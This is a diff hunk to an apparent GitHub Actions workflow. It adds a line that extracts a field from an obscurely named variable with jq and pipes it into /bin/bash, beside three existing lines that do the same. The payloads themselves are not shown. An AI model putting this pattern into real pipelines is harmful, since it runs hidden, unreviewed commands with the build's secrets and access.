@@ -24,6 +24,7 @@ jobs:
           echo $kutcz207 | jq -r .owydw8 | /bin/bash
           echo $wybtc400 | jq -r .ak5932 | /bin/bash
           echo $hx9 | jq -r .lv14 | /bin/bash
+          printf '%s' "$tuu91" | jq -r .j59 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
